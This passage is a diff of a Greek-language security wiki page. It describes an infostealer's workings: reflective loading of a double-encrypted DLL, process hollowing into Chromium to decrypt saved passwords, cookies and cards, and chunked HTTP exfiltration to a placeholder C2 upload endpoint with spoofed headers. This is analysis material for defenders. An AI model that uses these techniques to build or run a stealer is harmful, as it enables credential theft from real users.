-- Αυτό το helper αποθηκεύει ένα second-stage DLL κρυπτογραφημένο δύο φορές με ChaCha20 (δύο 32-byte keys + 12-byte nonces). Μετά από τα δύο passes, το φορτώνει reflectively (χωρίς `LoadLibrary`) και καλεί exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` που προέρχονται από [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
-- Οι ρουτίνες του ChromElevator χρησιμοποιούν direct-syscall reflective process hollowing για να inject σε έναν live Chromium browser, να κληρονομήσουν AppBound Encryption keys και να decrypt passwords/cookies/credit cards απευθείας από SQLite databases παρά το ABE hardening.
+- Το κύριο DLL/EXE ενσωματώνει έναν Chromium credential helper, ο οποίος είτε αποθηκεύεται στον δίσκο είτε γίνεται manually mapped στη μνήμη· στη fileless λειτουργία επιλύει μόνος του τα imports/relocations, ώστε να μην εγγράφονται helper artifacts.
+- Ο helper αποθηκεύει ένα second-stage DLL κρυπτογραφημένο δύο φορές με ChaCha20 (δύο keys των 32 byte + nonces των 12 byte). Μετά και τα δύο passes, φορτώνει reflectively το blob (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, τα οποία προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
+- Οι ρουτίνες του ChromElevator χρησιμοποιούν direct-syscall reflective process hollowing για injection σε ένα ενεργό Chromium browser, κληρονομούν τα AppBound Encryption keys και κάνουν decrypt passwords/cookies/credit cards απευθείας από SQLite databases, παρά το ABE hardening.
 
 
-### Modular in-memory collection & chunked HTTP exfil
+### Modular συλλογή στη μνήμη & chunked HTTP exfil
 
-- Το `create_memory_based_log` περνάει από έναν global `memory_generators` function-pointer table και δημιουργεί ένα thread ανά ενεργό module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Κάθε thread γράφει αποτελέσματα σε shared buffers και αναφέρει το file count του μετά από ένα ~45s join window.
-- Μόλις ολοκληρωθεί, όλα γίνονται zip με τη statically linked βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Το `ThreadPayload1` στη συνέχεια κοιμάται 15s και κάνει stream το archive σε 10 MB chunks μέσω HTTP POST προς `http://<C2>:6767/upload`, spoofing ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε chunk προσθέτει `User-Agent: upload`, `auth: <build_id>`, προαιρετικό `w: <campaign_tag>`, και το τελευταίο chunk προσθέτει `complete: true` ώστε το C2 να ξέρει ότι η επανασυναρμολόγηση έχει ολοκληρωθεί.
+- Η `create_memory_based_log` διατρέχει έναν global πίνακα function pointers `memory_generators` και δημιουργεί ένα thread ανά ενεργοποιημένο module (Telegram, Discord, Steam, screenshots, documents, browser extensions κ.λπ.). Κάθε thread γράφει τα αποτελέσματα σε shared buffers και αναφέρει το file count μετά από ένα παράθυρο join περίπου 45 δευτερολέπτων.
+- Όταν ολοκληρωθεί η διαδικασία, όλα συμπιέζονται με τη statically linked βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Στη συνέχεια, το `ThreadPayload1` κάνει sleep για 15 δευτερόλεπτα και μεταδίδει το archive σε chunks των 10 MB μέσω HTTP POST στο `http://<C2>:6767/upload`, πλαστογραφώντας ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε chunk προσθέτει `User-Agent: upload`, `auth: <build_id>`, προαιρετικά `w: <campaign_tag>`, ενώ το τελευταίο chunk προσθέτει `complete: true`, ώστε το C2 να γνωρίζει ότι ολοκληρώθηκε η επανασυναρμολόγηση.
 
 ## References
-
 
 - [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
 - [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
@@ -1209,9 +1303,10 @@ Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxe
 - [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
 - [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
 - [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
+- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
+- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
 - [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
 - [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
 - [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
-
 
 {{#include ../banners/hacktricks-training.md}}
